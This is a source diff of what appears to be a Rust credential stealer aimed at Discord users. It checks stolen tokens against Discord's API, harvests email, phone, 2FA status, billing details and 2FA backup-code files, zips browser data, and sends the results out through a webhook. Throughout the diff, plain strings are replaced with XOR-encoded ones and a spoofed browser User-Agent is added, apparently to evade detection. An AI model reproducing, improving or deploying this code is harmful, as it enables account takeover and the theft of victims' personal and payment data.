@@ -81,7 +81,7 @@ fn s_users_me() -> String {
     ])
 }
 
-fn s_billing_sources() -> String {
+fn s_billing() -> String {
     xor_str(&[
         0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
         0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
@@ -90,8 +90,170 @@ fn s_billing_sources() -> String {
     ])
 }
 
+#[allow(dead_code)]
+fn s_auth_login() -> String {
+    xor_str(&[
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
+        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x3B, 0x2F, 0x2E,
+        0x32, 0x75, 0x36, 0x35, 0x3D, 0x33, 0x34,
+    ])
+}
+
+#[allow(dead_code)]
+fn s_connections() -> String {
+    xor_str(&[
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E,
+        0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F,
+        0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F, 0x75, 0x39, 0x35, 0x34, 0x34, 0x3F, 0x39, 0x2E, 0x33,
+        0x35, 0x34, 0x29,
+    ])
+}
+
 fn s_auth_header() -> String {
     xor_str(&[0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34])
+}
+
+fn s_hdr_content_type() -> String {
+    xor_str(&[0x19, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x77, 0x0E, 0x23, 0x2A, 0x3F])
+}
+
+fn s_content_type() -> String {
+    xor_str(&[
+        0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35,
+        0x34,
+    ])
+}
+
+fn s_hdr_user_agent() -> String {
+    xor_str(&[0x0F, 0x29, 0x3F, 0x28, 0x77, 0x1B, 0x3D, 0x3F, 0x34, 0x2E])
+}
+
+fn s_user_agent() -> String {
+    xor_str(&[
+        0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33,
+        0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A,
+        0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A,
+        0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C,
+    ])
+}
+
+fn s_avatar_url_fmt() -> String {
+    xor_str(&[
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29,
+        0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2C, 0x3B,
+        0x2E, 0x3B, 0x28, 0x29, 0x75, 0x21, 0x27, 0x75, 0x21, 0x27, 0x74, 0x2A, 0x34, 0x3D,
+    ])
+}
+
+fn s_default_avatar_url() -> String {
+    xor_str(&[
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29,
+        0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3F, 0x37, 0x38,
+        0x3F, 0x3E, 0x75, 0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28, 0x29, 0x75, 0x6A, 0x74, 0x2A, 0x34,
+        0x3D,
+    ])
+}
+
+fn s_no_billing() -> String {
+    xor_str(&[0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D])
+}
+
+fn s_no_billing_info() -> String {
+    xor_str(&[
+        0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x7A, 0x33, 0x34, 0x3C, 0x35,
+        0x28, 0x37, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E,
+    ])
+}
+
+fn s_paypal_lbl() -> String {
+    xor_str(&[0x0A, 0x3B, 0x23, 0x0A, 0x3B, 0x36, 0x60, 0x7A])
+}
+
+fn s_cards_lbl() -> String {
+    xor_str(&[0x19, 0x3B, 0x28, 0x3E, 0x29, 0x60, 0x7A])
+}
+
+fn s_enabled() -> String {
+    xor_str(&[0x1F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E])
+}
+
+fn s_disabled() -> String {
+    xor_str(&[0x1E, 0x33, 0x29, 0x3B, 0x38, 0x36, 0x3F, 0x3E])
+}
+
+fn s_na() -> String {
+    xor_str(&[0x14, 0x75, 0x1B])
+}
+
+fn s_json_id() -> String {
+    xor_str(&[0x33, 0x3E])
+}
+
+fn s_json_username() -> String {
+    xor_str(&[0x2F, 0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F])
+}
+
+fn s_json_discriminator() -> String {
+    xor_str(&[
+        0x3E, 0x33, 0x29, 0x39, 0x28, 0x33, 0x37, 0x33, 0x34, 0x3B, 0x2E, 0x35, 0x28,
+    ])
+}
+
+fn s_json_avatar() -> String {
+    xor_str(&[0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28])
+}
+
+fn s_json_public_flags() -> String {
+    xor_str(&[0x2A, 0x2F, 0x38, 0x36, 0x33, 0x39, 0x05, 0x3C, 0x36, 0x3B, 0x3D, 0x29])
+}
+
+fn s_json_email() -> String {
+    xor_str(&[0x3F, 0x37, 0x3B, 0x33, 0x36])
+}
+
+fn s_json_phone() -> String {
+    xor_str(&[0x2A, 0x32, 0x35, 0x34, 0x3F])
+}
+
+fn s_json_mfa_enabled() -> String {
+    xor_str(&[0x37, 0x3C, 0x3B, 0x05, 0x3F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E])
+}
+
+fn s_json_last_4() -> String {
+    xor_str(&[0x36, 0x3B, 0x29, 0x2E, 0x05, 0x6E])
+}
+
+fn s_json_brand() -> String {
+    xor_str(&[0x38, 0x28, 0x3B, 0x34, 0x3E])
+}
+
+fn s_attachments() -> String {
+    xor_str(&[
+        0x3B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x37, 0x3F, 0x34, 0x2E, 0x29,
+    ])
+}
+
+fn s_files_prefix() -> String {
+    xor_str(&[0x3C, 0x33, 0x36, 0x3F, 0x29, 0x01])
+}
+
+fn s_files_suffix() -> String {
+    xor_str(&[0x07])
+}
+
+fn s_json_filename() -> String {
+    xor_str(&[0x3C, 0x33, 0x36, 0x3F, 0x34, 0x3B, 0x37, 0x3F])
+}
+
+fn files_part_name(idx: u64) -> String {
+    format!("{}{}{}", s_files_prefix(), idx, s_files_suffix())
+}
+
+fn s_backup_attached() -> String {
+    xor_str(&[
+        0xB8, 0xC6, 0xDF, 0x7A, 0x1B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x3F, 0x3E, 0x7A, 0x3B, 0x29,
+        0x7A, 0x3C, 0x33, 0x36, 0x3F,
+    ])
 }
 
 fn s_dpapi_prefix() -> Vec<u8> {
@@ -127,21 +289,29 @@ fn s_desktop() -> String {
     xor_str(&[0x1E, 0x3F, 0x29, 0x31, 0x2E, 0x35, 0x2A])
 }
 
-fn s_backup_codes_filename() -> String {
+fn s_backup_filename() -> String {
     xor_str(&[
         0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05,
         0x39, 0x35, 0x3E, 0x3F, 0x29, 0x74, 0x2E, 0x22, 0x2E,
     ])
 }
 
-fn s_backup_codes_base() -> String {
+fn s_backup_base() -> String {
     xor_str(&[
         0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05,
         0x39, 0x35, 0x3E, 0x3F, 0x29,
     ])
 }
 
-fn s_browser_data_zip() -> String {
+fn s_paren_space() -> String {
+    xor_str(&[0x7A, 0x72])
+}
+
+fn s_dot_txt() -> String {
+    xor_str(&[0x74, 0x2E, 0x22, 0x2E])
+}
+
+fn s_zip_filename() -> String {
     xor_str(&[
         0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x3E, 0x3B, 0x2E, 0x3B, 0x74, 0x20, 0x33,
         0x2A,
@@ -180,24 +350,39 @@ struct DdU {
     mfa_enabled: bool,
 }
 
-async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
-    let res = client
-        .get(s_users_me())
+fn apply_api_headers(
+    builder: reqwest::RequestBuilder,
+    token: &str,
+) -> reqwest::RequestBuilder {
+    builder
         .header(s_auth_header(), token)
+        .header(s_hdr_content_type(), s_content_type())
+        .header(s_hdr_user_agent(), s_user_agent())
+}
+
+async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
+    let res = apply_api_headers(client.get(s_users_me()), token)
         .send()
         .await
         .ok()?;
 
     if res.status().is_success() {
         let json: Value = res.json().await.ok()?;
-        let id = json["id"].as_str()?.to_string();
-        let username = json["username"].as_str()?.to_string();
-        let discrim = json["discriminator"].as_str().unwrap_or("0");
-        let avatar = json["avatar"].as_str().map(|s| s.to_string());
-        let public_flags = json["public_flags"].as_u64().unwrap_or(0);
-        let email = json["email"].as_str().unwrap_or("N/A").to_string();
-        let phone = json["phone"].as_str().unwrap_or("N/A").to_string();
-        let mfa_enabled = json["mfa_enabled"].as_bool().unwrap_or(false);
+        let id = json[s_json_id()].as_str()?.to_string();
+        let username = json[s_json_username()].as_str()?.to_string();
+        let discrim = json[s_json_discriminator()].as_str().unwrap_or("0");
+        let avatar = json[s_json_avatar()].as_str().map(|s| s.to_string());
+        let public_flags = json[s_json_public_flags()].as_u64().unwrap_or(0);
+        let na = s_na();
+        let email = json[s_json_email()]
+            .as_str()
+            .unwrap_or(&na)
+            .to_string();
+        let phone = json[s_json_phone()]
+            .as_str()
+            .unwrap_or(&na)
+            .to_string();
+        let mfa_enabled = json[s_json_mfa_enabled()].as_bool().unwrap_or(false);
 
         Some(DdU {
             id,
@@ -228,38 +413,36 @@ fn capitalize_brand(brand: &str) -> String {
 }
 
 async fn fetch_billing_info(client: &reqwest::Client, token: &str) -> String {
-    let res = match client
-        .get(s_billing_sources())
-        .header(s_auth_header(), token)
+    let res = match apply_api_headers(client.get(s_billing()), token)
         .send()
         .await
     {
         Ok(r) if r.status().is_success() => r,
-        _ => return "No billing".to_string(),
+        _ => return s_no_billing(),
     };
 
     let sources: Value = match res.json().await {
         Ok(v) => v,
-        Err(_) => return "No billing".to_string(),
+        Err(_) => return s_no_billing(),
     };
 
     let arr = match sources.as_array() {
         Some(a) => a,
-        None => return "No billing".to_string(),
+        None => return s_no_billing(),
     };
 
     let mut paypal_emails = Vec::new();
     let mut cards = Vec::new();
 
     for source in arr {
-        if let Some(email) = source.get("email").and_then(|e| e.as_str()) {
+        if let Some(email) = source.get(&s_json_email()).and_then(|e| e.as_str()) {
             if !email.is_empty() {
                 paypal_emails.push(email.to_string());
             }
         }
         if let (Some(last_4), Some(brand)) = (
-            source.get("last_4").and_then(|v| v.as_str()),
-            source.get("brand").and_then(|v| v.as_str()),
+            source.get(&s_json_last_4()).and_then(|v| v.as_str()),
+            source.get(&s_json_brand()).and_then(|v| v.as_str()),
         ) {
             cards.push(format!("•••• {} ({})", last_4, capitalize_brand(brand)));
         }
@@ -268,29 +451,29 @@ async fn fetch_billing_info(client: &reqwest::Client, token: &str) -> String {
     let paypal_part = if paypal_emails.is_empty() {
         None
     } else {
-        Some(format!("PayPal: {}", paypal_emails.join(", ")))
+        Some(format!("{}{}", s_paypal_lbl(), paypal_emails.join(", ")))
     };
 
     let cards_part = if cards.is_empty() {
         None
     } else {
-        Some(format!("Cards: {}", cards.join(", ")))
+        Some(format!("{}{}", s_cards_lbl(), cards.join(", ")))
     };
 
     match (paypal_part, cards_part) {
         (Some(p), Some(c)) => format!("{} | {}", p, c),
         (Some(p), None) => p,
         (None, Some(c)) => c,
-        (None, None) => "No billing information found".to_string(),
+        (None, None) => s_no_billing_info(),
     }
 }
 
 fn is_backup_codes_filename(name: &str) -> bool {
-    if name.eq_ignore_ascii_case(&s_backup_codes_filename()) {
+    if name.eq_ignore_ascii_case(&s_backup_filename()) {
         return true;
     }
 
-    let base = s_backup_codes_base();
+    let base = s_backup_base();
     if name.len() < base.len() + 6 {
         return false;
     }
@@ -299,11 +482,11 @@ fn is_backup_codes_filename(name: &str) -> bool {
     }
 
     let rest = &name[base.len()..];
-    if !rest.starts_with(" (") || !rest.ends_with(".txt") {
+    if !rest.starts_with(&s_paren_space()) || !rest.ends_with(&s_dot_txt()) {
         return false;
     }
 
-    let digits = &rest[2..rest.len() - 4];
+    let digits = &rest[s_paren_space().len()..rest.len() - s_dot_txt().len()];
     !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
 }
 
@@ -317,7 +500,7 @@ fn find_backup_codes() -> Option<String> {
             continue;
         }
 
-        let exact = dir.join(s_backup_codes_filename());
+        let exact = dir.join(s_backup_filename());
         if exact.is_file() {
             return exact.to_str().map(String::from);
         }
@@ -391,30 +574,30 @@ async fn send_webhook_message(
     let mut idx = 0u64;
 
     if let Some(zip) = zip_data {
-        attachment_meta.push(json!({
-            "id": idx,
-            "filename": s_browser_data_zip()
-        }));
+        let mut entry = serde_json::Map::new();
+        entry.insert(s_json_id(), json!(idx));
+        entry.insert(s_json_filename(), json!(s_zip_filename()));
+        attachment_meta.push(Value::Object(entry));
         if let Ok(part) = reqwest::multipart::Part::bytes(zip)
-            .file_name(s_browser_data_zip())
+            .file_name(s_zip_filename())
             .mime_str(&s_application_zip())
         {
-            file_parts.push((format!("files[{idx}]"), part));
+            file_parts.push((files_part_name(idx), part));
             idx += 1;
         }
     }
 
     if let Some(path) = backup_codes_path {
         if let Ok(data) = fs::read(path) {
-            attachment_meta.push(json!({
-                "id": idx,
-                "filename": s_backup_codes_filename()
-            }));
+            let mut entry = serde_json::Map::new();
+            entry.insert(s_json_id(), json!(idx));
+            entry.insert(s_json_filename(), json!(s_backup_filename()));
+            attachment_meta.push(Value::Object(entry));
             if let Ok(part) = reqwest::multipart::Part::bytes(data)
-                .file_name(s_backup_codes_filename())
+                .file_name(s_backup_filename())
                 .mime_str(&s_text_plain())
             {
-                file_parts.push((format!("files[{idx}]"), part));
+                file_parts.push((files_part_name(idx), part));
             }
         }
     }
@@ -426,7 +609,7 @@ async fn send_webhook_message(
 
     let mut payload = embed;
     if let Some(obj) = payload.as_object_mut() {
-        obj.insert("attachments".to_string(), json!(attachment_meta));
+        obj.insert(s_attachments(), json!(attachment_meta));
     }
 
     let payload_json = serde_json::to_string(&payload).unwrap_or_default();
@@ -606,13 +789,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                 .as_ref()
                                                                 .map(|h| {
                                                                     format!(
-                                                                        "https://cdn.discordapp.com/avatars/{}/{}.png",
+                                                                        s_avatar_url_fmt(),
                                                                         user.id, h
                                                                     )
                                                                 })
                                                                 .unwrap_or_else(|| {
-                                                                    "https://cdn.discordapp.com/embed/avatars/0.png"
-                                                                        .to_string()
+                                                                    s_default_avatar_url()
                                                                 });
 
                                                             let badges_display =
@@ -637,14 +819,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                 json!({ "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false }),
                                                                 json!({ "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false }),
                                                                 json!({ "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }),
-                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { "Enabled" } else { "Disabled" }), "inline": true }),
+                                                                json!({ "name": "<a:dark_butterfly:1441101545465974935> 2FA", "value": format!("`{}`", if user.mfa_enabled { s_enabled() } else { s_disabled() }), "inline": true }),
                                                                 json!({ "name": "<a:dark_butterfly:1441101545465974935> Billing Info", "value": format!("`{}`", billing_info), "inline": false }),
                                                             ];
 
                                                             if backup_codes_path.is_some() {
                                                                 embed_fields.push(json!({
                                                                     "name": "<a:dark_butterfly:1441101545465974935> Backup Codes",
-                                                                    "value": "✅ Attached as file",
+                                                                    "value": s_backup_attached(),
                                                                     "inline": false
                                                                 }));
                                                             }
